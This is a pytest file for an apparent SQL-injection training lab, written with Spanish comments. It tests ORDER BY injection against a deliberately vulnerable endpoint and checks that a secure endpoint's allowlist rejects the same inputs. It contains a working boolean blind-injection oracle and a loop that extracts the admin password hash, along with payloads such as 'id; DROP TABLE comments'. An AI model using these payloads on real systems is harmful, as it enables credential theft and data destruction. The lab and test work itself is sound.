"""Desafío etapa 1: cada ataque funciona en /vuln y queda bloqueado o neutralizado en /secure."""

import pytest

from app.db import get_conn


@pytest.fixture()
def seeded():
    """Garantiza varios comentarios con autores distintos para poder comparar órdenes."""
    with get_conn() as conn:
        for author, body in [("zoe", "z"), ("bruno", "b"), ("carla", "c")]:
            conn.execute("INSERT INTO comments (author, body) VALUES (?, ?)", (author, body))


# ── Reto 1: inyección en ORDER BY ───────────────────────────────────────────

ORACLE = "(CASE WHEN (SELECT substr(password_hash, {pos}, 1) FROM users WHERE username = 'admin') = '{ch}' THEN id ELSE -id END)"


def _ids(response):
    return [row["id"] for row in response.json()]


def test_reto1_case_when_cambia_el_orden(client, seeded):
    verdadero = _ids(client.get("/vuln/comments/sorted", params={"sort": ORACLE.format(pos=1, ch="p")}))
    falso = _ids(client.get("/vuln/comments/sorted", params={"sort": ORACLE.format(pos=1, ch="x")}))
    assert verdadero == sorted(verdadero)  # condición verdadera -> ascendente
    assert falso == sorted(falso, reverse=True)  # condición falsa -> descendente
    assert verdadero != falso


def test_reto1_blind_sqli_extrae_el_prefijo_del_hash(client, seeded):
    """El oráculo booleano alcanza para leer el hash carácter por carácter."""
    alfabeto = "abcdefghijklmnopqrstuvwxyz0123456789_$"
    extraido = ""
    for pos in range(1, 14):
        for ch in alfabeto:
            ids = _ids(client.get("/vuln/comments/sorted", params={"sort": ORACLE.format(pos=pos, ch=ch)}))
            if ids == sorted(ids):
                extraido += ch
                break
    assert extraido == "pbkdf2_sha256"


@pytest.mark.parametrize(
    "params",
    [
        {"sort": ORACLE.format(pos=1, ch="p")},
        {"sort": "id; DROP TABLE comments"},
        {"sort": "body"},
        {"direction": "asc, (SELECT 1)"},
        {"direction": "sideways"},
        {"sort": "author", "direction": "desc--"},
    ],
)
def test_reto1_secure_rechaza_fuera_de_allowlist(client, seeded, params):
    assert client.get("/secure/comments/sorted", params=params).status_code in (400, 422)


def test_reto1_secure_ordena_por_autor_desc(client, seeded):
    rows = client.get("/secure/comments/sorted", params={"sort": "author", "direction": "desc"}).json()
    autores = [r["author"] for r in rows]
    assert autores == sorted(autores, reverse=True)


@pytest.mark.parametrize("direction", ["ASC", "Desc", "dEsC"])
def test_reto1_secure_direccion_sin_importar_mayusculas(client, seeded, direction):
    rows = client.get("/secure/comments/sorted", params={"sort": "id", "direction": direction}).json()
    ids = [r["id"] for r in rows]
    assert ids == sorted(ids, reverse=direction.lower() == "desc")
